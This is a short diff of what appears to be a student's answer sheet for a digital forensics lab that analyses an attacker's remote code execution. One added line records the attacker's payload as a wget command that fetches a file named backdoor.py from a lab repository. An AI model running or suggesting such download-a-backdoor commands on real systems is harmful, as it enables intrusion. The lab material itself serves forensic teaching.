@@ -23,8 +23,7 @@ id
 
 
 # 6:  Can you identify the packet numbers in which the attacker exploited the Remote Code Execution vulnerability to gain access to the system? What was the exact payload used by the attacker?
-Packet no : 
-Payload : backdoor.py
+wget https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
 
 
 # 7:  After gaining access to the system, what does the attacker seem to be doing?
